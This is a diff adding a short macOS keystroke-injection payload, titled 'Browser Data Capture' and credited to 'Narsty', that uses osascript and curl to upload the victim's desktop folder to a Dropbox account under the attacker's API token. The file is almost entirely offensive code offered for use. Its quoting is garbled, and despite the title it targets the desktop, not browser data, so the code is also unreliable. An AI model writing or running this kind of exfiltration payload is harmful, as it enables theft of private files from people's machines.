@@ -1,0 +1,18 @@
+REM Author: Narsty
+REM Title: Browser Data Capture
+REM Version 1.0 MacOs
+
+
+
+osascript -e 'tell application "Script Editor"
+	set desktopPath to POSIX path of (path to desktop folder)
+	set dropboxAPIPath to "Your API token Here"
+	set uploadScript to "curl -X POST 'URL of the Dropbox API endpoint' \
+		-H 'Authorization: Bearer " & dropboxAPIPath & "' \
+		-H 'Dropbox-API-Arg: {\"path\": \"/Desktop/$(basename \\\"" & desktopPath & "\\\"), \\\"mode\\\": \\\"overwrite\\\"}' \
+		-H 'Content-Type: application/octet-stream' \
+		--data-binary @\"" & desktopPath & "\""
+	do shell script uploadScript
+end tell'
+
+
